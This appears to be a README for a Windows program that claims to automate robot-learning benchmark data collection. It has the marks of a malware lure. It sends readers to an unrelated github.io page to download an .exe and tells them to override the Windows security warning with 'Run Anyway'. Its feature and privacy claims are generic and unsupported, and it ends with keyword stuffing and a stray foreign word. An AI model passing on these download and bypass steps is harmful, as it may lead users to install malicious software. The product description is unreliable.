# 🤖 embodied-eval-automation - Automate your robot learning data collection

[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://evidentiary-operatingmicroscope154.github.io)

This application helps you collect data for robotics research. It manages the steps needed to run tests on robots or simulations. You use it to track how different robot brains perform on tasks. It keeps your data organized and ensures you can repeat your experiments.

## 🛠 Prerequisites

Your computer needs to meet hardware requirements to run this software. You need a modern Windows 10 or 11 system. We suggest at least 16 gigabytes of memory and a solid-state drive for storage. If you plan to run video-based models, a dedicated graphics card provides better performance.

Ensure you have current drivers for your hardware. You do not need to install complex coding environments to run this tool. The software handles the background logic for you.

## 💾 Installation and Setup

Follow these steps to set up the software on your Windows machine:

1. Visit this page to download the latest version: https://evidentiary-operatingmicroscope154.github.io
2. Look for the file that ends in .exe under the latest version header. Select that link to save the installer to your computer.
3. Open your Downloads folder and double-click the file you saved.
4. Windows might show a warning message because the software is new. Select More Info and then Run Anyway to start the installation.
5. Follow the on-screen prompts. Choose a folder on your drive where you want to keep the program.
6. Once the process finishes, a shortcut图标 will appear on your desktop.

## ⚙️ How to use the application

The main screen shows a dashboard where you manage your sessions. Follow these steps to collect your first set of data:

1. Open the application using the desktop shortcut.
2. Select the Configuration tab to choose your target task. You can pick from a list of standard benchmarks included in the menu.
3. Define your output folder. The software saves all collected results here. It creates dated subfolders for every run to keep your files clean.
4. Set the number of episodes you want to collect. The tool automatically handles the start and stop signals for each test.
5. Click the Start button. The application opens the necessary simulation or robot connection. 
6. Watch the progress bar in the main window. It displays the status of each current episode. 
7. If you reach an error, the software saves a log file in the output folder. You can share this log if you need to troubleshoot.

## 📂 Understanding your data

The software saves every file in a standard format. Each run contains the video feed, the robot actions, and the benchmark score. 

- Data folders include a summary file. Open this file with any spreadsheet program to see your results. 
- Video files use standard formats that play in most media players.
- The software exports data in a way that pairs inputs with outcomes. This makes your work easy to audit.

## ⚖️ Permission and Safety

This tool respects your computer settings. It requires permission to access your file system to save your experiment results. It also requests access to network settings to communicate with simulation software. The program does not look at your personal files or send private data to external servers. It only interacts with the task folders you define.

## ❓ Frequently Asked Questions

**What happens if the software stops during a test?**
The tool includes a recovery mode. When you restart the app, it checks the output folder for incomplete runs. It asks if you want to resume where you left off.

**Can I run multiple benchmarks at once?**
Yes. You can open multiple instances of the software if your computer hardware supports the workload. Use the configuration menu to point each instance to a different output directory to avoid file conflicts.

**How do I update the software?**
Return to the provided release page. Download the newest installer and run it. The installer overwrites the old version while keeping your settings and configuration files.

**Does this software record my screen?**
No. It only records the data stream from the robot or the simulation engine. It does not look at your desktop or other open windows.

**Where do I find logs for troubleshooting?**
Click the Help menu and select Open Log Folder. This opens a file explorer window with text files that explain what the system did during your last session.

**Can I use this for non-robotics projects?**
The software design centers on robot learning workflows. While you can adapt it to other types of data collection, it performs best for the specific tasks listed in the configuration menu.

Keywords: agent-skills, automation, benchmark, codex, dataset, embodied-ai, evaluation, reproducibility, robot-learning, robotics, vla, world-model